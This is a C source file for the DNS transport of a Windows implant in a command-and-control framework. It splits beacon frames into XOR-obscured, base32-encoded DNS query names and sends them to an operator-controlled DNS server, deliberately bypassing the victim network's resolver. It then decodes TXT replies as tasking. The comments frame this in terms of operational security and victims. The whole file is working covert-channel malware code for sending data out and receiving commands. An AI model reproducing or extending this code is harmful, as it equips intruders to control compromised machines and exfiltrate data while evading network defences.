/* dns_transport.c — DNS TXT beacon transport. See dns_transport.h for the
 * wire contract. Pure framing helpers (dns_xor/dns_b32enc/dns_build_qnames)
 * are network-free and covered by the selftest harness; only dns_txt_query
 * touches the wire (DnsQuery_A, dnsapi.lib).
 *
 * The whole translation unit is gated on C2_TRANSPORT_DNS so default HTTP
 * builds do not link dnsapi or embed DnsQuery_A strings (OPSEC). */
#include "dns_transport.h"

#if defined(C2_TRANSPORT_DNS)

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <windns.h>

#include "crypto_cng.h"

/* 57-byte body slices (Go agent dnsFragmentMaxBody parity): 57 bytes -> 92
 * base32 chars -> two 63-char labels, qname stays far below the 253 cap. */
#define DNS_FRAG_BODY 57
/* Server cap (dns_listener.go dnsFragMaxTotal): larger frames must fall back. */
#define DNS_FRAG_MAX_TOTAL 64
#define DNS_QNAME_MAX 253
#define DNS_LABEL_MAX 63

void dns_xor(BYTE *data, DWORD len, const char *key) {
    size_t klen;
    DWORD i;
    if (!data || !key || !key[0]) return;
    klen = strlen(key);
    for (i = 0; i < len; i++) data[i] ^= (BYTE)key[i % klen];
}

char *dns_b32enc(const BYTE *in, DWORD len) {
    static const char alphabet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
    /* ceil(len*8/5) output chars, no padding, plus NUL. */
    size_t outlen = (len == 0) ? 0 : (size_t)(((unsigned long long)len * 8 + 4) / 5);
    char *out = (char *)malloc(outlen + 1);
    size_t pos = 0;
    DWORD i;
    if (!out) return NULL;
    for (i = 0; i < len;) {
        unsigned long long acc = 0;
        int have = 0, need, j;
        /* Pull up to 5 bytes into the accumulator. */
        while (have < 5 && i < len) {
            acc = (acc << 8) | in[i++];
            have++;
        }
        /* have bytes = have*8 bits -> ceil(have*8/5) chars. */
        need = (have * 8 + 4) / 5;
        acc <<= (5 * 8 - have * 8); /* left-align into 40 bits */
        for (j = 0; j < need; j++) {
            out[pos++] = alphabet[(acc >> 35) & 31];
            acc <<= 5;
        }
    }
    out[pos] = '\0';
    return out;
}

/* strip_dashes copies hex chars of a dashed UUID into out (32 chars + NUL).
 * Returns the hex length, or 0 when nothing usable was found. */
static size_t strip_dashes(const char *uuid_dashed, char *out) {
    size_t n = 0;
    if (!uuid_dashed || !out) return 0;
    while (*uuid_dashed && n < 64) {
        char c = *uuid_dashed++;
        if (c == '-') continue;
        out[n++] = c;
    }
    out[n] = '\0';
    return n;
}

void dns_free_qnames(char **names, DWORD count) {
    DWORD i;
    if (!names) return;
    for (i = 0; i < count; i++) free(names[i]);
    free(names);
}

int dns_build_qnames(const char *uuid_dashed, const BYTE *body, DWORD bodylen,
                     const char *domain, int obscure,
                     char ***out_names, DWORD *out_count) {
    char uuid[65];
    size_t uuidlen, domlen;
    DWORD total, i;
    char **names;
    if (!out_names || !out_count) return -1;
    *out_names = NULL;
    *out_count = 0;
    if (!domain || !domain[0]) return -1;
    uuidlen = strip_dashes(uuid_dashed, uuid);
    if (uuidlen == 0 || uuidlen > 64) return -1;
    domlen = strlen(domain);
    /* Worst case per query: uuid + "." + "64_63" + "." + two 63 labels +
     * ".dns." + domain + NUL. Reject absurd domains up front. */
    if (uuidlen + 1 + 5 + 1 + 2 * DNS_LABEL_MAX + 5 + domlen + 1 > DNS_QNAME_MAX)
        return -1;

    total = (bodylen + DNS_FRAG_BODY - 1) / DNS_FRAG_BODY;
    if (bodylen == 0) total = 1; /* bare "<uuid>.dns.<domain>" poll */
    if (total > DNS_FRAG_MAX_TOTAL) return -1;

    names = (char **)calloc(total, sizeof(char *));
    if (!names) return -1;
    for (i = 0; i < total; i++) {
        DWORD off = i * DNS_FRAG_BODY;
        DWORD fraglen = (off + DNS_FRAG_BODY <= bodylen) ? DNS_FRAG_BODY : (bodylen - off);
        BYTE tmp[DNS_FRAG_BODY];
        char *enc = NULL, *q = NULL;
        size_t qcap, pos;
        char meta[16];
        if (bodylen == 0) fraglen = 0;
        if (fraglen > 0) {
            memcpy(tmp, body + off, fraglen);
            if (obscure) dns_xor(tmp, fraglen, uuid);
        }
        enc = dns_b32enc(fraglen ? tmp : NULL, fraglen);
        if (!enc) { dns_free_qnames(names, i); return -1; }
        _snprintf(meta, sizeof(meta), "%lu_%lu",
                  (unsigned long)total, (unsigned long)i);
        /* uuid.meta.enc-labels.dns.domain + NUL */
        qcap = uuidlen + 1 + strlen(meta) + 1 + strlen(enc) + 64 + 5 + domlen + 2;
        q = (char *)malloc(qcap);
        if (!q) { free(enc); dns_free_qnames(names, i); return -1; }
        pos = 0;
        memcpy(q + pos, uuid, uuidlen); pos += uuidlen;
        q[pos++] = '.';
        memcpy(q + pos, meta, strlen(meta)); pos += strlen(meta);
        { /* split the base32 stream into 63-char labels */
            size_t epos = 0, elen = strlen(enc);
            while (epos < elen) {
                size_t chunk = elen - epos > DNS_LABEL_MAX ? DNS_LABEL_MAX : elen - epos;
                q[pos++] = '.';
                memcpy(q + pos, enc + epos, chunk); pos += chunk;
                epos += chunk;
            }
        }
        free(enc);
        memcpy(q + pos, ".dns.", 5); pos += 5;
        memcpy(q + pos, domain, domlen); pos += domlen;
        q[pos] = '\0';
        if (pos > DNS_QNAME_MAX) { free(q); dns_free_qnames(names, i); return -1; }
        names[i] = q;
    }
    *out_names = names;
    *out_count = total;
    return 0;
}

/* split_hostport parses "ip" or "ip:port" into a NUL-terminated ip buffer
 * and a port (default 53). Bracketed IPv6 "[::1]:5353" is accepted. */
static void split_hostport(const char *server, char *ip, size_t iplen, int *port) {
    const char *colon;
    size_t iplen2;
    *port = 53;
    if (!server || !server[0]) { ip[0] = '\0'; return; }
    if (server[0] == '[') {
        const char *end = strchr(server, ']');
        if (!end) { ip[0] = '\0'; return; }
        iplen2 = (size_t)(end - server - 1);
        if (iplen2 >= iplen) iplen2 = iplen - 1;
        memcpy(ip, server + 1, iplen2);
        ip[iplen2] = '\0';
        if (end[1] == ':') *port = atoi(end + 2);
        return;
    }
    /* Bare IPv6 (multiple colons, no brackets): no port parsing. */
    colon = strrchr(server, ':');
    if (colon && !strchr(colon + 1, ':')) {
        int p = atoi(colon + 1);
        if (p > 0 && p < 65536) {
            *port = p;
            iplen2 = (size_t)(colon - server);
            if (iplen2 >= iplen) iplen2 = iplen - 1;
            memcpy(ip, server, iplen2);
            ip[iplen2] = '\0';
            return;
        }
    }
    strncpy(ip, server, iplen - 1);
    ip[iplen - 1] = '\0';
}

char *dns_txt_query(const char *dns_server, const char *qname, DWORD *outlen) {
    char ip[128];
    int port = 53;
    IP4_ARRAY srv;
    PDNS_RECORD recs = NULL, cur;
    DNS_STATUS st;
    char *out = NULL;
    size_t cap = 0, len = 0;
    if (outlen) *outlen = 0;
    if (!qname || !qname[0]) return NULL;
    split_hostport(dns_server, ip, sizeof(ip), &port);
    if (!ip[0]) return NULL;
    /* DnsQuery pins the server through PIP4_ARRAY, which carries no port:
     * the query always goes to UDP/53 on the given address. A non-default
     * port is refused loudly instead of being silently ignored (a raw-socket
     * DNS client is the follow-up that lifts this limit). */
    if (port != 53) return NULL;

    /* Pin the query to the operator's DNS server: the explicit server list
     * bypasses the system resolver (and any hostile DNS on the victim
     * network) for C2 traffic. The _A variant is used deliberately so TXT
     * strings are always ANSI regardless of the UNICODE build flag. */
    memset(&srv, 0, sizeof(srv));
    srv.AddrCount = 1;
    srv.AddrArray[0] = inet_addr(ip);
    if (srv.AddrArray[0] == INADDR_NONE) return NULL; /* IPv4 literal only */
    st = DnsQuery_A(qname, DNS_TYPE_TEXT,
                    DNS_QUERY_BYPASS_CACHE | DNS_QUERY_NO_HOSTS_FILE,
                    &srv, &recs, NULL);
    if (st != ERROR_SUCCESS || !recs) return NULL;
    for (cur = recs; cur; cur = cur->pNext) {
        DWORD i;
        if (cur->wType != DNS_TYPE_TEXT) continue;
        for (i = 0; i < cur->Data.TXT.dwStringCount; i++) {
            const char *s = cur->Data.TXT.pStringArray[i];
            size_t slen;
            if (!s) continue;
            slen = strlen(s);
            if (slen == 0) continue;
            while (len + slen + 1 > cap) {
                cap = cap ? cap * 2 : 512;
                out = (char *)realloc(out, cap);
                if (!out) { DnsRecordListFree(recs, DnsFreeRecordList); return NULL; }
            }
            memcpy(out + len, s, slen);
            len += slen;
        }
    }
    DnsRecordListFree(recs, DnsFreeRecordList);
    if (!out) return NULL;
    out[len] = '\0';
    if (outlen) *outlen = (DWORD)len;
    return out;
}

/* is_blank_ack reports the server's "keep sending" ack: empty or whitespace. */
static int is_blank_ack(const char *s, DWORD len) {
    DWORD i;
    for (i = 0; i < len; i++) {
        if (s[i] != ' ' && s[i] != '\t' && s[i] != '\r' && s[i] != '\n')
            return 0;
    }
    return 1;
}

char *dns_beacon_post(const char *dns_server, const char *domain,
                      const char *uuid_dashed,
                      const char *frame, DWORD framelen,
                      int obscure, DWORD *outlen) {
    char **names = NULL;
    DWORD total = 0, i;
    char *result = NULL;
    if (outlen) *outlen = 0;
    if (!dns_server || !domain || !frame) return NULL;
    if (dns_build_qnames(uuid_dashed, (const BYTE *)frame, framelen,
                         domain, obscure, &names, &total) != 0)
        return NULL;
    for (i = 0; i < total; i++) {
        char *ans = NULL;
        DWORD anslen = 0;
        ans = dns_txt_query(dns_server, names[i], &anslen);
        if (!ans) { dns_free_qnames(names, total); return NULL; }
        if (i + 1 < total) {
            /* Intermediate fragment: server acks blank. Anything else is
             * unexpected but harmless — keep sending, the final answer is
             * the only one that matters. */
            free(ans);
            continue;
        }
        dns_free_qnames(names, total);
        names = NULL;
        if (is_blank_ack(ans, anslen)) { free(ans); return NULL; }
        { /* final answer: base64( [XOR(uuid) response-json] ) */
            char uuid[65];
            BYTE *dec = NULL;
            DWORD declen = 0;
            /* trim surrounding whitespace (server pads A/AAAA chunks; TXT
             * concat should already be clean, but be liberal) */
            while (anslen > 0 && (ans[anslen-1] == ' ' || ans[anslen-1] == '\t' ||
                                  ans[anslen-1] == '\r' || ans[anslen-1] == '\n'))
                ans[--anslen] = '\0';
            dec = b64dec(ans, &declen);
            free(ans);
            if (!dec) return NULL;
            if (strip_dashes(uuid_dashed, uuid) == 0) { free(dec); return NULL; }
            if (obscure) dns_xor(dec, declen, uuid);
            result = (char *)malloc(declen + 1);
            if (!result) { free(dec); return NULL; }
            memcpy(result, dec, declen);
            result[declen] = '\0';
            free(dec);
            if (outlen) *outlen = declen;
            return result;
        }
    }
    dns_free_qnames(names, total);
    return NULL;
}

#endif /* C2_TRANSPORT_DNS */
